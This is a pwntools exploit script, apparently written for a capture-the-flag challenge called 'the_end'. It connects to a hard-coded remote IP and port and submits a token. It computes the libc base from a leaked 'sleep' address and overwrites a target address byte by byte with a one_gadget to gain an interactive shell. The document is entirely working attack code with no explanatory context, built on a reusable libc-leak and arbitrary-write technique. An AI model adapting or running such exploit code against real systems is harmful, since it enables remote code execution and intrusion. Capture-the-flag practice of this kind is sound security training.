from pwn import *
context.log_level = "debug"
# p = process("./the_end")
p = remote("150.109.44.250" , 20002)

libc = ELF("./libc64.so")
token = "vfIOXGUb1v1JUHbyxXxEdICZUQB2Az8y"
p.sendline(token)
p.recvuntil("gift ")

sleep_addr = int(p.recvuntil(",")[:-1] , 16)
p.recv()
print(hex(libc.sym["sleep"]))
libc_base = sleep_addr - libc.sym["sleep"]
log.success("libc_base : " + hex(libc_base))
log.success("libc_")

call_addr = libc_base + 0x5f0f48

one_gadgets = [0x45216 , 0x4526a , 0xf02a4 , 0xf1147 ]
target_value = libc_base + one_gadgets[2]
print(p64(target_value))
for i in range(4):
	p.send(p64(call_addr + i))
	p.send(p64(target_value)[i])

p.interactive()